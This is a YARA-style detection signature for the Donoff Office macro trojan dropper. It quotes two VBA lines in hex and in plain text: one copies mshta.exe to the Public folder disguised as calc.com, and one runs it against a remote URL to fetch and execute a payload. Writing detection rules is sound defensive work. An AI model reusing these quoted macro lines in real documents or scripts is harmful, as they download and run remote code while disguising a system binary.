
rule TrojanDropper_O97M_Donoff_STD_MTB{
	meta:
		description = "TrojanDropper:O97M/Donoff.STD!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,02 00 02 00 02 00 00 "
		
	strings :
		$a_01_0 = {3d 20 53 68 65 6c 6c 28 22 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 63 61 6c 63 2e 63 6f 6d 20 22 22 68 74 74 70 3a 2f 2f 64 6f 63 75 6d 65 6e 74 73 2e 70 72 6f 2e 62 72 2f 69 6e 6a 63 74 69 6f 6e 2e 6d 70 33 22 22 22 2c 20 76 62 4e 6f 72 6d 61 6c 46 6f 63 75 73 29 } //1 = Shell("C:\Users\Public\calc.com ""http://documents.pro.br/injction.mp3""", vbNormalFocus)
		$a_01_1 = {66 73 6f 2e 63 6f 70 79 66 69 6c 65 20 22 43 3a 5c 57 69 6e 64 6f 77 73 5c 53 79 73 74 65 6d 33 32 5c 6d 73 68 74 61 2e 65 78 65 22 2c 20 45 6e 76 69 72 6f 6e 28 22 50 55 42 4c 49 43 22 29 20 26 20 22 5c 63 61 6c 63 2e 63 6f 6d 22 2c 20 54 72 75 65 } //1 fso.copyfile "C:\Windows\System32\mshta.exe", Environ("PUBLIC") & "\calc.com", True
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1) >=2
 
}